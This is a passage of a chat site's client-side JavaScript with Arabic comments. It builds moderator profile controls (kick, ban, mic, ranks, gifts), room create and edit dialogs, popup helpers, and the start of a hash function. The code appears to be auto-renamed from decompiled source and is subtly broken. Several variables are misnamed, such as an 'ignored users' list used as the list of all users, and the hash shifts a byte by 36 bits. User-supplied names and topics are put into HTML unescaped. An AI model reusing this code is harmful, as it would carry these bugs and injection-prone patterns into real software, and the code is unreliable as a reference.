                    var roomOptionNode = $("<option></option>");
                    roomOptionNode.attr("value", chatRoomsList[i].id);
                    if (chatRoomsList[i].id == myroom) {
                        roomOptionNode.css("color", "blue"); // تلوين غرفتك الحالية باللون الأزرق
                        roomOptionNode.attr("selected", 'true');
                    }
                    roomOptionNode.text('[' + (chatRoomsList[i].uco + '').padStart(2, '0') + ']' + chatRoomsList[i].topic);
                    roomDropdownMenu.append(roomOptionNode);
                }

                // فرز وترتيب قائمة الغرف تنازلياً داخل صندوق الاختيارات لسهولة البحث الرقابي
                var sortedRoomOptions = $("#rooms .roomz option");
                var mappedRoomsArray = sortedRoomOptions.map(function (idx, optionEl) {
                    return {
                        't': $(optionEl).text(),
                        'v': optionEl.value
                    };
                }).get();

                mappedRoomsArray.sort(function (roomOptionA, roomOptionB) {
                    var nameA = roomOptionA.t.toLowerCase();
                    var nameB = roomOptionB.t.toLowerCase();
                    return nameA > nameB ? -1 : nameA < nameB ? 1 : 0;
                });

                // تفعيل كليك زر إرسال الدعوة وتوجيه أمر rinvite الفعلي للسيرفر
                profileModalWindow.find(".uroomz").off().click(function () {
                    send("rinvite", {
                        'id': targetUserId,
                        'rid': roomDropdownMenu.val(),
                        'pwd': profileModalWindow.find(".rpwd").val() // إرسال كلمة المرور إذا كانت الغرفة مقفلة برقم سري
                    });
                });
            } else {
                profileModalWindow.find(".roomzbox").hide();
            }

            // 3. إدارة ميزة تعديل وتصفير لايكات السمعة الخاصة بالعضو قسرياً (صلاحية setLikes)
            if (userPermissionsConfig.setLikes) {
                profileModalWindow.find(".likebox").show();
                profileModalWindow.find(".likebox .likec").val(targetUserObj.rep); // عرض عدد لايكاته الحالية rep
                profileModalWindow.find(".ulikec").off().click(function () {
                    var updatedLikesCount = parseInt(profileModalWindow.find(".likebox .likec").val()) || 0;
                    // تمرير القيمة الجديدة للأمر setLikes بالسيرفر
                    send("setLikes", {
                        'id': targetUserObj.id,
                        'likes': updatedLikesCount
                    });
                });
            } else {
                profileModalWindow.find(".likebox").hide();
            }

            // 4. لوحة تعديل ومنح الرتب والعضويات المحمية VIP وتحديد مدتها بالأيام (صلاحية setpower الخارقة للـ Owner والمشرفين)
            if (userPermissionsConfig.setpower) {
                // ترتيب مصفوفة الرتب المتاحة تصاعدياً بناءً على مستوى الـ Rank
                activeAlerts = activeAlerts.sort(function (powerA, powerB) {
                    return powerB.rank - powerA.rank;
                });
                profileModalWindow.find(".powerbox").show();
                var powerSelectMenu = profileModalWindow.find(".userpower");

                // تصفير حقل البحث عن الرتب وفلترة الصلاحيات المتاحة لرتبتك الحالية
                profileModalWindow.find("#upsearch").off().val('').change(function () {
                    uprochange(userPermissionsConfig, targetUserObj.power);
                });

                uprochange(userPermissionsConfig, targetUserObj.power);
                profileModalWindow.find(".powerbox .userdays").val(0); // تحديد عدد الأيام (0 تعني رتبة دائمة)

                // تفعيل كليك زر التطبيق وإرسال التعديل النهائي إلى الكنترول بالأمر setpower وحقنه بـ lid الفريد للعضو
                profileModalWindow.find(".upower").off().click(function () {
                    var durationDays = parseInt(profileModalWindow.find(".userdays").val()) || 0;
                    send('cp', {
                        'cmd': "setpower",
                        'id': targetUserObj.lid,
                        'days': durationDays,
                        'power': powerSelectMenu.val()
                    });
                });
            } else {
                profileModalWindow.find(".powerbox").hide();
            }
            // تكملة دالة upro: التحقق من صلاحيات إدارة الغرفة الحالية ورسم الأزرار التفاعلية
            if (currentRoomObj != null) {
                // تفعيل علم صلاحيات الغرفة إذا كنت مالكها أو مشرفاً مسجلاً في مصفوفة الـ ops للروم أو تملك صلاحية roomowner العامة
                if (currentRoomObj.ops != null) {
                    if (currentRoomObj.ops.indexOf(allUsersList[myid].lid) != -1 || currentRoomObj.owner == allUsersList[myid].lid || userPermissionsConfig.roomowner) {
                        isRoomOwnerPermission = true;
                    }
                }

                // بناء وحقن زر الغرفة الحالية المتواجد بها العضو مع إضافة دالة النقر rjoin للانتقال والتنقل معه
                currentRoomName = "<div class=\"fl btn btn-primary dots roomh border\" style=\"padding:0px 5px;max-width:180px;\" onclick=\"rjoin('" + currentRoomObj.id + "')\"><img style=\"max-width:24px;\" src='" + currentRoomObj.pic + "'>" + currentRoomObj.topic + "</div>";
                profileModalWindow.find(".u-room").html(currentRoomName);
                profileModalWindow.find(".u-room").show();
            } else {
                profileModalWindow.find(".u-room").hide();
            }

            // 1. التحكم بأزرار طرد الغرفة urkick وتعيين مشرف الروم umod بناءً على صلاحيات الروم
            if (isRoomOwnerPermission) {
                profileModalWindow.find(".urkick,.umod").show();
            } else {
                profileModalWindow.find(".urkick,.umod").hide();
            }

            // 2. التحكم بحالة أزرار التجاهل والكتم الشخصية (التغيير التلقائي بين زر umute وزر uunmute)
            if (isUserIgnoredInList(targetUserObj)) {
                profileModalWindow.find(".umute").hide();
                profileModalWindow.find(".uunmute").show();
            } else {
                profileModalWindow.find(".umute").show();
                profileModalWindow.find(".uunmute").hide();
            }

            profileModalWindow.find(".ureport").hide();

            // 3. التحكم برؤية زر إعطاء بنر ترحيبي ubnr بناءً على صلاحية setpower الخارقة
            if (userPermissionsConfig.setpower != true) {
                profileModalWindow.find(".ubnr").hide();
            } else {
                profileModalWindow.find(".ubnr").show();
            }

            // 4. التحكم برؤية زر بث أوامر كشف النكات والسوابق uh بناءً على صلاحية السجل history
            if (userPermissionsConfig.history != true) {
                profileModalWindow.find(".uh").hide();
            } else {
                profileModalWindow.find(".uh").show();
            }

            // 5. التحكم بأزرار الطرد العام ukick وحذف صورة البروفايل المخالفة udelpic بناءً على نقاط كلاس الطرد kick
            if (userPermissionsConfig.kick < 1) {
                profileModalWindow.find(".ukick").hide();
                profileModalWindow.find(".udelpic").hide();
            } else {
                profileModalWindow.find(".ukick").show();
                profileModalWindow.find(".udelpic").show();
            }

            // 6. التحكم بزر الحظر بند uban بناءً على امتلاك المشرف لصلاحية الحظر ban بالجدول
            if (!userPermissionsConfig.ban) {
                profileModalWindow.find(".uban").hide();
            } else {
                profileModalWindow.find(".uban").show();
            }

            // 7. التحكم بزر إرسال الهدايا والدروع ugift بناءً على تفعيل رتبة ميزات الترقية upgrades
            if (userPermissionsConfig.upgrades < 1) {
                profileModalWindow.find(".ugift").hide();
            } else {
                profileModalWindow.find(".ugift").show();
            }

            // 8. التحكم بقفل أو إتاحة أزرار إدارة مايكات العضو (سحب المايك uml، قفل المايك umm، تفعيل المايك uma)
            if (userPermissionsConfig.mic) {
                profileModalWindow.find(".uml,.umm,.uma").show();
            } else {
                profileModalWindow.find(".uml,.umm,.uma").hide();
            }

            // ==========================================
            // برمجة وتفعيل أحداث النقر (Click Events) لكافة أزرار لوحة بروفايل العضو وإرسال السوكت
            // ==========================================

            // زر كشف النكات والسوابق (uh): يغلق اللوحة ويرسل طلب كشف النكات الإداري للسيرفر
            profileModalWindow.find(".uh").css("background-color", '').off().click(function () {
                $(this).css("background-color", "indianred"); // إعطاء لون أحمر مؤقت للدلالة على النقر
                profileModalWindow.modal("hide");
                send('uh', targetUserId);
            });

            // زر سحب المايك قسرياً من العضو (uml)
            profileModalWindow.find('.uml').css("background-color", '').off().click(function () {
                send("uml", targetUserId);
                $(this).css("background-color", "indianred");
            });

            // زر كتم وقفل المايك الحالي للعضو (umm)
            profileModalWindow.find(".umm").css("background-color", '').off().click(function () {
                send("umm", targetUserId);
                $(this).css("background-color", "indianred");
            });

            // زر تفعيل وإعطاء المايك للعضو قسرياً (uma)
            profileModalWindow.find('.uma').css("background-color", '').off().click(function () {
                send("uma", targetUserId);
                $(this).css("background-color", "indianred");
            });

            // زر التجاهل والكتم الشخصي للعضو (umute): يكتم رسائله في المتصفح ويحدث الأزرار بالواجهة
            profileModalWindow.find(".umute").css("background-color", '').off().click(function () {
                $(this).css("background-color", "indianred");
                addUserToIgnore(targetUserObj);
                profileModalWindow.find(".umute").hide();
                profileModalWindow.find(".uunmute").show();
            });

            // زر إلغاء التجاهل والـ Unignore (uunmute)
            profileModalWindow.find(".uunmute").css("background-color", '').off().click(function () {
                $(this).css("background-color", "indianred");
                removeUserFromIgnore(targetUserObj);
                profileModalWindow.find(".umute").show();
                profileModalWindow.find(".uunmute").hide();
            });

            // زر ترفيع العضو كمشرف للغرفة الحالية (umod): يرسل طلب الترقية بالأمر op+ للسيرفر
            profileModalWindow.find(".umod").css("background-color", '').off().click(function () {
                $(this).css("background-color", "indianred");
                send("op+", {
                    'lid': targetUserObj.lid
                });
            });

            // زر الإعجاب وزيادة سمعة العضو (ulike): يرسل أمر السوكت like ويرسم إجمالي لايكاته الحالية
            profileModalWindow.find(".ulike").css("background-color", '').off().click(function () {
                $(this).css("background-color", "indianred");
                send("action", {
                    'cmd': "like",
                    'id': targetUserId
                });
            }).text(formatLargeNumber(targetUserObj.rep || 0) + '');

            // زر الإبلاغ عن العضو والشكاوى (ureport)
            profileModalWindow.find(".ureport").css("background-color", '').off().click(function () {
                $(this).css("background-color", "indianred");
                send("action", {
                    'cmd': "report",
                    'id': targetUserId
                });
            });

            // زر طرد العضو العام والمؤقت من الشات بالكامل (ukick): يوجه أمر السيرفر kick ويغلق اللوحة
            profileModalWindow.find(".ukick").css("background-color", '').off().click(function () {
                $(this).css("background-color", "indianred");
                send("action", {
                    'cmd': "kick",
                    'id': targetUserId
                });
                profileModalWindow.modal("hide");
            });

            // زر حذف صورة بروفايل العضو المخالفة لقوانين الدردشة قسرياً (udelpic)
            profileModalWindow.find(".udelpic").css("background-color", '').off().click(function () {
                $(this).css("background-color", "indianred");
                send("action", {
                    'cmd': "delpic",
                    'id': targetUserId
                });
            });

            // زر طرد وقفل دخول العضو من الغرفة الحالية فقط (urkick / roomkick)
            profileModalWindow.find(".urkick").css("background-color", '').off().click(function () {
                $(this).css("background-color", "indianred");
                send("action", {
                    'cmd': "roomkick",
                    'id': targetUserId
                });
                profileModalWindow.modal("hide");
            });

            // زر حظر العضو النهائي والكامل من سيرفر الشات (uban / ban) بند السوكت الفعال
            profileModalWindow.find(".uban").css("background-color", '').off().click(function () {
                $(this).css("background-color", "indianred");
                send("action", {
                    'cmd': "ban",
                    'id': targetUserId
                });
                profileModalWindow.modal("hide");
            });
            // زر إرسال تنبيه خاص للعضو (unot): يفتح لوحة إدخال النص الآلية ويوجّه أمر التنبيه للسيرفر
            profileModalWindow.find(".unot").css("background-color", '').off().click(function () {
                var unotBtnInstance = this;
                openSecondaryAdminNotification(function (notificationMessageText) {
                    send("action", {
                        'cmd': "not",
                        'id': targetUserId,
                        'msg': notificationMessageText
                    });
                    $(unotBtnInstance).css("background-color", "indianred"); // تلوين الزر بالأحمر للدلالة على نجاح الإرسال
                });
            });

            // زر إرسال الهدايا والدروع التفاعلية للعضو (ugift): يفتح صندوقاً عائماً لعرض الهدايا dro3 المتاحة
            profileModalWindow.find(".ugift").css("background-color", '').off().click(function () {
                var giftsContainerNode = $("<div class=\"break fl\" style=\"max-height:400px;width:300px;background-color:white;\"></div>");

                // حقن صور الهدايا المتاحة في الشات مع ربط كليك الاختيار بدالة إرسال الهدية gift
                $.each(groupIcons, function (index, giftFileName) {
                    giftsContainerNode.append("<img style='padding:5px;margin:4px;max-width:160px;max-height:40px;' class='btn hand borderg corner' src='dro3/" + giftFileName + "' onclick='gift(\"" + targetUserId + "\",\"" + giftFileName + "\");'>");
                });
                // إضافة زر الحذف وإزالة الهدية التفاعلية من بروفايل العضو
                giftsContainerNode.append("<button style='padding:5px;margin:4px;' class='btn btn-primary hand borderg corner fa fa-ban'  onclick='gift(\"" + targetUserId + "\",\"\");'>إزاله الهديه</button>");
                openPopupDialog(profileModalWindow.find(".ugift"), giftsContainerNode, false).css('left', "0px");
            });

            // زر منتقي وإعطاء البنرات وأيقونات الترحيب التفاعلية (ubnr): يفتح صندوقاً عائماً لعرض الأيقونات sico
            profileModalWindow.find(".ubnr").css("background-color", '').off().click(function () {
                var bannersContainerNode = $("<div class=\"break\" style=\"max-height:400px;width:300px;background-color:white;\"></div>");

                // حقن البنرات المتاحة وربط كليك الاختيار بدالة معالجة البنرات البرمجية ubnr
                $.each(activeBansList, function (index, bannerFileName) {
                    bannersContainerNode.append("<img style='padding:5px;margin:4px;max-width:160px;max-height:40px;' class='btn hand borderg corner' src='sico/" + bannerFileName + "' onclick='ubnr(\"" + targetUserId + "\",\"" + bannerFileName + "\");'>");
                });
                // إضافة زر حذف وإلغاء الترحيب من بروفايل العضو
                bannersContainerNode.append("<button style='padding:5px;margin:4px;' class='btn btn-primary hand borderg corner fa fa-ban'  onclick='ubnr(\"" + targetUserId + "\",\"\");'>إزاله البنر</button>");
                openPopupDialog(profileModalWindow.find(".ubnr"), bannersContainerNode, false).css("left", "0px");
            });

            // فتح وعرض لوحة مودال البروفايل بالكامل وتعبئة الترويسة (الهيدر) باسم وصورة العضو وأيقونته الخاصة
            profileModalWindow.modal();
            var iconBadgeHtml = '';
            if (iconPath != '') {
                iconBadgeHtml = "<img class=\"fl u-ico\"  alt=\"\" src=\"" + iconPath + "\">";
            }
            profileModalWindow.find(".modal-title").html("<img style='width:18px;height:18px;' src='" + targetUserObj.pic + "'>" + iconBadgeHtml + targetUserObj.topic);

            // زر محادثة الخاص (upm): يغلق لوحة البروفايل ويفتح شاشة شات الخاص الفورية مع العضو upm
            profileModalWindow.find(".upm").off().click(function () {
                profileModalWindow.modal("hide");
                openw(targetUserId, true);
            });
            fixSize(1);
        }

        // دالة تصفية وفلترة محرك قائمة الرتب المتاحة للمشرف عند محاولة إعطاء رتبة لعضو (Powers List UI Filter)
        function uprochange(adminPermissions, currentTargetUserPower) {
            var profileModalWindow = $("#upro");
            var powerSearchQuery = $("#upsearch").val(); // جلب نص البحث المكتوب في خانة فلترة الرتب #upsearch

            // تصفية مصفوفة الرتب بناءً على المدخل: إما جلب كافة الرتب المسجلة بالشات أو جلب المطابق للبحث بالاسم أو قوة الـ rank
            var filteredPowersList = powerSearchQuery == '' ? activeAlerts : activeAlerts.filter(function (singlePowerObj) {
                return singlePowerObj.rank == powerSearchQuery || singlePowerObj.name.indexOf(powerSearchQuery) != -1;
            });

            var powerDropdownMenu = profileModalWindow.find(".userpower");
            powerDropdownMenu.empty(); // تنظيف الخيارات الحالية
            powerDropdownMenu.append("<option></option>");

            // حلقة تكرار لحقن الرتب المصفاة، مع حظر وإغلاق الرتب الأعلى من رتبة المشرف الحالي (disabled) منعاً لتجاوز الرتب
            for (var i = 0; i < filteredPowersList.length; i++) {
                var powerOptionNode = $("<option></option>");
                if (filteredPowersList[i].rank > adminPermissions.rank) {
                    powerOptionNode = $("<option disabled></option>"); // تجميد الاختيار إذا كانت الرتبة أقوى منك لحماية السيرفر
                }
                powerOptionNode.attr("value", filteredPowersList[i].name);
                // تلوين رتبة العضو الحالية الحالية باللون الأزرق داخل القائمة تلقائياً
                if (filteredPowersList[i].name == currentTargetUserPower) {
                    powerOptionNode.css("color", "blue");
                    powerOptionNode.attr("selected", "true");
                }
                powerOptionNode.text('[' + filteredPowersList[i].rank + "] " + filteredPowersList[i].name);
                powerDropdownMenu.append(powerOptionNode);
            }
        }


        // دالة إنشاء القوائم الإدارية السريعة والخيارات الفورية وعناصر التحكم (Context Menu Builder)
        function openContextMenu(triggerElement, optionsArray, selectionCallback) {
            var menuContainerNode = $("<div class='border bg' style='min-width:66px;margin-top:4px;padding:2px;'></div>");

            // توليد أزرار الخيارات الإدارية الممررة (مثل: سحب المايك، قفل المايك، تفعيل المايك) عمودياً
            for (var i = 0; i < optionsArray.length; i++) {
                var optionBtnNode = $("<button class=' btn btn-primary' style='display:block;width:100%;padding: 2px 4px;margin-top:1px;'></button>").text(optionsArray[i]).on("click", function () {
                    selectionCallback($(this).text()); // تمرير اسم الخيار المختار للدالة المستمعة للأوامر الإدارية
                });
                menuContainerNode.append(optionBtnNode);
            }
            // فتح الصندوق منبثقاً وعائماً بشكل ذكي ومباشر فوق الزر الحالي
            return openPopupDialog(triggerElement, menuContainerNode).removeClass("light").removeClass("border").css("max-height", "80%");
        }

        // المحرك التنفيذي الأساسي لبناء وتوليد النوافذ العائمة الموضعية المشفرة بكلاس الـ ppop (Smart Popup Engine)
        function openPopupDialog(triggerElement, htmlContentToAppend, closeOnOutsideClick) {
            $(".ppop").remove(); // مسح وتدمير أي نافذة عائمة قديمة مفتوحة بالخلفية فوراً لمنع التكدس بالرام
            triggerElement = $(triggerElement);
            var elementOffset = triggerElement.offset(); // جلب إحداثيات وموقع الزر الذي تم النقر عليه بدقة (Left / Top)

            // إنشاء كادر النافذة العائمة وتثبيت موضعها برمجياً ل تظهر فوق الزر مباشرة بدقة بكسلية
            var popupBoxNode = $("<div class=\"ppop light border break\" style=\"z-index:9000;position: fixed;left:" + elementOffset.left + "px;top:" + elementOffset.top + "px;\"></div>");

            setTimeout(function () {
                popupBoxNode.append(htmlContentToAppend);
                $(triggerElement.parent()).append(popupBoxNode); // حقن وصناعة النافذة العائمة بالواجهة أمام المستخدم

                // خوارزمية موازنة الأبعاد الذكية: التحقق مما إذا كانت أبعاد النافذة العائمة تخرج عن إطار الشاشة يميناً أو يساراً، لتعديل موضعها تلقائياً بالمعادلة الرياضية
                if (elementOffset.left + popupBoxNode.width() > window.innerWidth) {
                    popupBoxNode.css("left", Math.max(0, Math.ceil(elementOffset.left - popupBoxNode.width())));
                }
                if (elementOffset.top + popupBoxNode.height() > window.innerHeight) {
                    popupBoxNode.css("top", Math.max(0, Math.ceil(elementOffset.top - popupBoxNode.height())));
                }

                // برمجة حدث النقر على أي مكان فارغ بالمتصفح لإغلاق وتدمير النافذة العائمة ppop تلقائياً لحفظ المظهر
                if (closeOnOutsideClick != true) {
                    setTimeout(function () {
                        $(document.body).one("click", function () {
                            $(".ppop").remove();
                        });
                    }, 120); // تأخير بسيط لضمان التقاط حدث النقر الخارجي
                }
            }, 10);
            return popupBoxNode;
        }

        // دالة إنشاء وفتح نافذة منبثقة مستقلة متكاملة (Popup Windows Creator / Modal Boxer)
        function openAdminPopupDialog(titleText, bodyContentHtml) {
            $(".popx").remove(); // تنظيف وتدمير أي نافذة منبثقة مفتوحة سابقاً بالخلفية
            var popupNode = $($("#pop").html()); // جلب قالب الـ HTML الافتراضي المخفي للبوب اب #pop
            popupNode.addClass("popx");

            popupNode.find(".title").append(titleText); // حقن عنوان النافذة
            popupNode.find(".pphide").addClass("phide");
            popupNode.find(".body").append(bodyContentHtml); // حقن المحتوى الداخلي للنافذة (جداول، مدخلات، إلخ)

            $(document.body).append(popupNode);
            popupNode.show();
            return popupNode;
        }

        // دالة حصر وجلب مصفوفة الأعضاء المتواجدين حالياً داخل غرفة معينة (Get Users In Specific Room)
        function getUsersInSpecificRoom(targetRoomId) {
            var cachedRoomInstance = rcach[targetRoomId];
            if (cachedRoomInstance == null) {
                return [];
            }
            // فحص وتصفية مصفوفة الأعضاء الإجمالية وإرجاع المتطابقين مع الآي دي للروم المستهدفة
            return $.grep(ignoredUsersList, function (singleUserObj) {
                return singleUserObj.roomid == targetRoomId;
            });
        }

        // دالة فحص وتفكيك الروابط لجلب قيم الـ Parameters الممررة عبر رابط صفحة الويب المتصفحة URL
        function getQueryParamValue(paramName) {
            var queryString = window.location.search.substring(1);
            var querySegments = queryString.split('&');
            for (var i = 0; i < querySegments.length; i++) {
                var keyValuePair = querySegments[i].split('=');
                if (keyValuePair[0] == paramName) {
                    // فك ترميز القيمة مع تنظيفها وحظر وسوم الحقن لسلامة المتصفح
                    return ('' + decodeURIComponent(keyValuePair[1])).split('<').join("&#x3C;");
                }
            }
        }

        // دالة فتح وبرمجة مودال إنشاء وإضافة غرفة شات جديدة بالكامل (Create New Room Dialog Box) المربوط بـ #mkr
        function mkr() {
            $("#ops").children().remove(); // تصفير قائمة المشرفين
            var makeRoomModal = $('#mkr'); // المعرف المستخرج من فحصك لصندوق صناعة الغرف mkr

            // تهيئة الواجهة: إخفاء أزرار الحفظ والتعديل لعرض واجهة "إنشاء غرفة جديدة" نقية
            makeRoomModal.find(".rsave").hide();
            makeRoomModal.find(".rdelete").hide();
            makeRoomModal.find(".modal-title").text("إنشاء غرفه جديدة");
            makeRoomModal.modal();

            // تصفير حقول المدخلات الافتراضية بمودال الإنشاء
            makeRoomModal.find(".rtopic").val(''); // حقل اسم الغرفة الجديد
            makeRoomModal.find(".rabout").val(''); // وصف الغرفة أو القوانين الداخلية
            makeRoomModal.find(".rpwd").val(''); // حقل كلمة المرور (لصناعة غرفة مقفلة بكلمة سر)
            makeRoomModal.find(".rwelcome").val(''); // رسالة الترحيب التلقائية داخل الروم
            makeRoomModal.find(".rmax").val(''); // الحد الأقصى لطاقة الغرفة الاستيعابية من الزوار

            // ضبط لون خلفية الروم الافتراضي باللون الأسود
            makeRoomModal.find(".cpick").attr('v', "#000000").css("background-color", "#000000");
            makeRoomModal.find("img").attr("src", "room.png"); // الصورة الافتراضية
            makeRoomModal.find(".rdel").prop("checked", false).parent().show();

            // برمجة حدث النقر على زر "إنشاء" وإرسال كائن مواصفات الروم للسيرفر عبر أمر السوكت الحقيقي r+
            makeRoomModal.find(".rmake").show().off().click(function () {
                makeRoomModal.find(".rl").val('');
                makeRoomModal.find(".rvl").val('');
                makeRoomModal.find('.rv').hide().prop("checked", false);

                send('r+', {
                    'c': makeRoomModal.find(".cpick").attr('v') || "#000000",
                    'topic': makeRoomModal.find(".rtopic").val(),
                    'about': makeRoomModal.find(".rabout").val(),
                    'welcome': makeRoomModal.find(".rwelcome").val(),
                    'pass': makeRoomModal.find(".rpwd").val(),
                    'max': parseInt(makeRoomModal.find(".rmax").val()) || 0x14, // القيمة الافتراضية 20 زائر
                    'delete': makeRoomModal.find(".rdel").prop("checked") == false,
                    'l': parseInt(makeRoomModal.find('.rl').val()) || 0,
                    'vl': parseInt(makeRoomModal.find(".rvl").val()) || 0,
                    'pic': makeRoomModal.find('img').attr('src')
                });
                makeRoomModal.modal("hide");
            });
        }

        // دالة فتح وبرمجة مودال إدارة وتعديل إعدادات أو حذف الغرفة (Edit / Delete Room Dialog Panel) المربوط بـ #mkr و .redit
        function redit(targetRoomIdParam) {
            $("#ops").children().remove();
            if (targetRoomIdParam == null) {
                targetRoomIdParam = myroom; // إذا لم يمرر آي دي للروم، يتم فتح إعدادات غرفتك الحالية تلقائياً
            }
            var currentRoomObj = rcach[targetRoomIdParam];
            if (currentRoomObj == null) {
                return;
            }
            var editRoomModal = $("#mkr");
            editRoomModal.find(".modal-title").text("إداره الغرفه");

            // 1. برمجة زر "حفظ التعديلات" وتجميع القيم المحدثة وبثها للسيرفر عبر أمر السوكت الحقيقي r^
            editRoomModal.find(".rsave").show().off().click(function () {
                send('r^', {
                    'id': targetRoomIdParam,
                    'c': editRoomModal.find(".cpick").attr('v') || "#000000",
                    'topic': editRoomModal.find(".rtopic").val(),
                    'about': editRoomModal.find(".rabout").val(),
                    'welcome': editRoomModal.find(".rwelcome").val(),
                    'pass': editRoomModal.find(".rpwd").val(),
                    'max': parseInt(editRoomModal.find(".rmax").val()) || 2,
                    'l': parseInt(editRoomModal.find(".rl").val()) || 0,
                    'vl': parseInt(editRoomModal.find(".rvl").val()) || 0,
                    'pic': editRoomModal.find('img').attr("src")
                });

                // التحقق مما إذا كان المشرف يملك صلاحية التحكم وتفعيل قفل مايكات الغرفة قسرياً (cmic)
                if (parseUserPowerString(allUsersList[myid].power).cmic) {
                    send('v', {
                        'id': targetRoomIdParam,
                        'v': editRoomModal.find(".rv").prop("checked") // خيار تفعيل أو إلغاء مايك الغرفة العام
                    });
                }
                editRoomModal.modal("hide");
            });

            // 2. برمجة زر "حذف الغرفة" بشكل نهائي من الشات وتمرير طلب التدمير بالأمر r- للسيرفر
            editRoomModal.find(".rdelete").show().off().click(function () {
                if (confirm("تأكيد حذف الغرفه؟")) {
                    send('r-', {
                        'id': targetRoomIdParam
                    });
                    editRoomModal.modal("hide");
                }
            });

            editRoomModal.modal({
                'title': "ffff"
            });

            // سحب وحقن إعدادات الغرفة الحالية وتعبئتها داخل خانات المودال تلقائياً ليراها المشرف قبل التعديل
            editRoomModal.find(".rpwd").val('');
            editRoomModal.find(".rtopic").val(currentRoomObj.topic);
            editRoomModal.find(".rabout").val(currentRoomObj.about);
            editRoomModal.find(".rwelcome").val(currentRoomObj.welcome);
            editRoomModal.find(".rmax").val(currentRoomObj.max);
            editRoomModal.find(".rl").val(currentRoomObj.l || '');
            editRoomModal.find(".rvl").val(currentRoomObj.vl || '');
            editRoomModal.find(".rv").show().prop("checked", currentRoomObj.v == true); // حالة المايك للغرفة
            editRoomModal.find(".rmake").hide(); // إخفاء زر الإنشاء الأصلي
            editRoomModal.find(".rdel").parent().hide();
            editRoomModal.find("img").attr("src", currentRoomObj.pic);
            editRoomModal.find(".cpick").attr('v', currentRoomObj.c || "#000000").css("background-color", currentRoomObj.c || "#000000");

            // جلب وضخ قائمة الكادر الإشرافي الحالي (الأوبن) الخاص بهذه الغرفة وتحديث اللوحة ops بالسيرفر
            send("ops", {
                'roomid': targetRoomIdParam
            });
        }

        // دالة التحديث اللحظي المباشر لمظهر، بيانات، وأيقونات الغرفة الفعالة (Room UI View Sync Updater)
        function updateRoomRowInSidebarUi(roomPayloadObj) {
            if (isNoIconActive || roomPayloadObj.pic == "room.png" && typeof room_pic == "string") {
                roomPayloadObj.pic = room_pic;
            }
            roomPayloadObj.c = roomPayloadObj.c || "#000000";
            var roomRowElement = roomPayloadObj.ht; // الكائن الرسومي المخزن للغرفة بالواجهة

            roomRowElement.find(".u-pic").css("background-image", "url(" + roomPayloadObj.pic + ')');

            // إذا كانت الغرفة مشفرة ومحمية بكلمة مرور، قم بحقن أيقونة القفل المخفية lock.png بجانب اسمها بالكامل
            if (roomPayloadObj.needpass) {
                roomRowElement.find(".u-topic").html("<img src=\"imgs/lock.png\" style=\"margin:2px;margin-top:4px;\" class=\"fl\">" + roomPayloadObj.topic).css("color", roomPayloadObj.c);
            } else {
                var topicNode = roomRowElement.find(".u-topic");
                topicNode[0].innerText = roomPayloadObj.topic;
                topicNode.css("color", roomPayloadObj.c);
            }

            roomRowElement.attr('n', roomPayloadObj.topic || '');
            roomRowElement.find(".u-msg")[0].innerText = roomPayloadObj.about; // تحديث نص وصف أو قوانين الغرفة بالواجهة

            // إدارة تبديل الأيقونات الصوتية (أيقونة المايك fa-microphone والتنبيه الأحمر label-danger للروم المقفلة المايكات)
            roomRowElement.find('.uc').toggleClass("fa-microphone", roomPayloadObj.v).toggleClass("label-danger", roomPayloadObj.v).toggleClass("label-primary", !roomPayloadObj.v);

            // معالجة واحتساب ظل الألوان لخلفية صندوق الغرفة بناءً على لون النص المختار لها بالكنترول
            var calculatedRoomShade = generateColorShade(roomPayloadObj.c || "#000000", -0x1e);
            roomRowElement[0].style["background-color"] = calculatedRoomShade == "#000000" || false ? '' : calculatedRoomShade + '06';
        }

        // دالة بناء وتوليد صف الغرفة الرسومي بالكامل لأول مرة (Room Row HTML Template Compiler) وحقنه بـ #rooms
        function compileRoomRowHtml(roomPayloadObj, returnNodeOnly) {
    if (isNoIconActive || roomPayloadObj.pic == "room.png" && typeof room_pic == "string") {
        roomPayloadObj.pic = room_pic;
    }

    // --- التعديل لحل مشكلة الشاشة البيضاء ---
    if (!cachedRoomHtmlTemplate || cachedRoomHtmlTemplate === '*') {
        cachedRoomHtmlTemplate = $("#rhtml").html();
    }
    // ----------------------------------------

    // بناء العنصر البرمجي بالاعتماد على كود التصميم الافتراضي المخزن لهياكل الغرف rhtml من الاندكس
    var roomNode = $(cachedRoomHtmlTemplate);
            roomNode[0].className += " r" + roomPayloadObj.id;
            roomNode[0].setAttribute("onclick", "rjoin('" + roomPayloadObj.id + "');"); // ربط حدث النقر بدالة طلب الدخول rjoin
            roomNode[0].setAttribute('v', '0');

            roomPayloadObj.ht = roomNode; // حفظ العنصر في سياق الغرفة الحالي
            roomPayloadObj.uco = 0; // تصفير عداد الزوار الابتدائي للغرفة الجديدة

            updateRoomRowInSidebarUi(roomPayloadObj); // معالجة المظهر وضبط الأيقونات والألوان للروم

            // خيار الإرجاع الفوري كـ Node أو الحقن الكلي والمباشر بداخل صندوق ألبوم غرف الشات #rooms
            if (returnNodeOnly != true) {
                $("#rooms").append(roomNode);
            } else {
                return roomNode;
            }
        }
        // دالة البحث عن مستخدم معين في مصفوفة المتواجدين بواسطة معرّف الـ lid الفريد له
        function findUserByLid(targetLid) {
            return $.grep(ignoredUsersList, function (singleUserObj) {
                return singleUserObj.lid == targetLid;
            })[0];
        }

        // دالة إغلاق وإزالة حاوية محادثة الخاص بالكامل من الواجهة (تنظيف عناصر الـ DOM)
        function wclose(targetUserId) {
            $('#c' + targetUserId).remove(); // إزالة شريط المحادثة من قائمة الخاص الجانبية
            $('.w' + targetUserId).remove(); // إزالة نافذة الشات الخاصة التابعة للمستخدم
            msgs();
        }

        // خوارزمية السيرفر السرية لاحتساب شفرة وتوليد رقم التذكرة الهاش الفريد لكل نك نيم (MurmurHash-like String Hashing)
        function executeHashAlgorithm(inputStringArray, seedValue) {
            var remainingBytes;
            var roundedLength;
            var hashResult;
            var currentBlock;
            var tempMultiplier;
            var currentByteIndex;

            inputStringArray = inputStringArray.join('');
            remainingBytes = inputStringArray.length & 3;
            roundedLength = inputStringArray.length - remainingBytes;
            hashResult = seedValue;

            // قيم ومعاملات الضرب الرياضية الثابتة للخوارزمية الست عشرية
            // 0xcc9e2d51 و 0x1b873593
            currentByteIndex = 0;
            while (currentByteIndex < roundedLength) {
                tempMultiplier = inputStringArray.charCodeAt(currentByteIndex) & 0xff | (inputStringArray.charCodeAt(++currentByteIndex) & 0xff) << 0x8 | (inputStringArray.charCodeAt(++currentByteIndex) & 0xff) << 36 | (inputStringArray.charCodeAt(++currentByteIndex) & 0xff) << 0x18;
                ++currentByteIndex;
